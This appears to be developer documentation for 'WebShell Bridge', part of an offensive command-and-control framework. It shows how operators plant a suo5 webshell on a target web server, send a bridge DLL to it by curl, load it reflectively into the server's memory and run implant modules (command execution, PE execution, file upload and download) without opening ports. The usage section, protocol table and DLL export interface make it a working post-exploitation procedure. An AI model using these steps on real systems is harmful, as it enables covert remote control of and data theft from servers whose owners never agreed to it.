# WebShell Bridge

## Overview

WebShell Bridge enables IoM to operate through webshells (JSP/PHP/ASPX) using a memory channel architecture. The bridge DLL is loaded into the web server process memory, and the webshell calls DLL exports directly via function pointers — no TCP ports opened on the target.

- **Product layer**: Server sees a `CustomPipeline(type="webshell")`. Operators interact via `webshell new/start/stop/delete` commands.
- **Implementation layer**: Bridge binary runs on the operator machine, sending HTTP requests to the webshell with `X-Stage` headers.
- **Transport layer**: The webshell loads the DLL, resolves exports, and calls `bridge_init`/`bridge_process` directly. Pure memory channel.

## Architecture

```
Product Layer (operator sees)
─────────────────────────────
  Client/TUI
    webshell new --listener my-listener
    use <session>
    exec whoami

  Server
    CustomPipeline(type="webshell")
    Session appears like any other implant session


Bridge Binary (server/cmd/webshell-bridge/)
─────────────────────────────────────────
  Runs on operator machine, connects to Server via ListenerRPC (mTLS)

  ┌─ HTTP transport ───────────────────────────────────────┐
  │  HTTP POST with X-Stage headers to webshell URL        │
  │  Raw protobuf over HTTP body (no malefic framing)      │
  └────────────────────────────────────────────────────────┘

  ┌─ spite/session adapter ────────────────────────────────┐
  │  SpiteStream ↔ HTTP request/response translation       │
  │  Session registration, checkin, task routing            │
  └────────────────────────────────────────────────────────┘


Target Web Server Process
─────────────────────────
  WebShell (JSP/PHP/ASPX)
    - Bridge DLL loading (ReflectiveLoader)
    - Export resolution (bridge_init, bridge_process)
    - X-Stage: spite → call bridge_process() → return response
    - No port opened, no TCP loopback

  Bridge Runtime DLL (in web server process memory)
    ┌─ export interface ────────────────────────────────┐
    │  bridge_init()    → Register (SysInfo + Modules)  │
    │  bridge_process() → Spites in/out (protobuf)      │
    └───────────────────────────────────────────────────┘

    ┌─ malefic module runtime ─────────────────────────┐
    │  exec / bof / execute_pe / upload / download / ...│
    │  All malefic modules available                    │
    └──────────────────────────────────────────────────┘
```

## Data Flow

```
Client exec("whoami")
  → Server (SpiteStream)
    → Bridge binary (HTTP POST X-Stage: spite)
      → WebShell (calls bridge_process via function pointer)
        → DLL module runtime
          → exec("whoami") → "root"
        → Spite response returned from bridge_process
      → HTTP response body
    → Bridge binary → SpiteStream.Send(response)
  → Server → Client displays "root"
```

## Usage

### 1. Build and run bridge binary

```bash
go build -o webshell-bridge ./server/cmd/webshell-bridge/

webshell-bridge \
  --auth listener.auth \
  --suo5 suo5://target.com/suo5.aspx \
  --listener my-listener \
  --token CHANGE_ME_RANDOM_TOKEN
```

The `--token` must match the `STAGE_TOKEN` constant in the webshell. The suo5 URL is converted to HTTP(S) automatically (`suo5://` → `http://`, `suo5s://` → `https://`).

At startup the bridge registers the listener, opens `JobStream`, and waits for pipeline control messages.

### 2. Register and start the pipeline from Client/TUI

```
webshell new --listener my-listener
```

### 3. Deploy webshell + load bridge DLL

Deploy the suo5 webshell (JSP/PHP/ASPX) to the target web server, then send the bridge DLL:

```bash
curl -X POST \
  -H "X-Stage: load" \
  -H "X-Token: CHANGE_ME_RANDOM_TOKEN" \
  --data-binary @bridge.dll \
  http://target.com/suo5.aspx
```

The webshell loads the DLL via ReflectiveLoader, then resolves `bridge_init`/`bridge_process` exports from the mapped PE image. If the DLL is not loaded when the pipeline starts, the bridge retries with exponential backoff.

### 4. Interact

```
use <session-id>
exec whoami
upload /local/file /remote/path
download /remote/file
```

## Protocol

### HTTP Endpoints (X-Stage headers)

| Stage | Method | Description |
|-------|--------|-------------|
| `load` | POST | Load bridge DLL into memory (body = raw DLL bytes) |
| `status` | POST | Check if DLL is loaded (returns `LOADED` or `NOT_LOADED`) |
| `init` | POST | Get Register data from `bridge_init()` (returns `[4B sessionID LE][Register protobuf]`) |
| `spite` | POST | Process Spites via `bridge_process()` (body/response = serialized `Spites` protobuf) |

All stage requests require `X-Token` header matching `STAGE_TOKEN`.

### DLL Export Interface

The bridge DLL must export these functions:

```c
// Initialize and return serialized Register protobuf
// Output format: [4 bytes sessionID LE][Register protobuf bytes]
int __stdcall bridge_init(
    uint8_t* out_buf,      // output buffer
    uint32_t out_cap,      // buffer capacity
    uint32_t* out_len      // actual bytes written
);  // returns 0 on success

// Process serialized Spites protobuf, return response Spites
int __stdcall bridge_process(
    uint8_t* in_buf,       // input Spites protobuf
    uint32_t in_len,       // input length
    uint8_t* out_buf,      // output buffer for response Spites
    uint32_t out_cap,      // buffer capacity
    uint32_t* out_len      // actual bytes written
);  // returns 0 on success

// Optional: cleanup
int __stdcall bridge_destroy();
```

The DLL must also export `ReflectiveLoader` for the loading phase. The webshell uses ReflectiveLoader to map the DLL, then resolves `bridge_init`/`bridge_process` from the mapped image's export table.

## Key Files

| Purpose | Path |
|---------|------|
| Bridge binary | `server/cmd/webshell-bridge/` |
| Channel (HTTP) | `server/cmd/webshell-bridge/channel.go` |
| Session management | `server/cmd/webshell-bridge/session.go` |
| Client commands | `client/command/pipeline/webshell.go` |
| CustomPipeline (server) | `server/listener/custom.go` |
| Webshell (ASPX) | `suo5-webshell/suo5.aspx` |
| Webshell (PHP) | `suo5-webshell/suo5.php` |
| Webshell (JSP) | `suo5-webshell/suo5.jsp` |
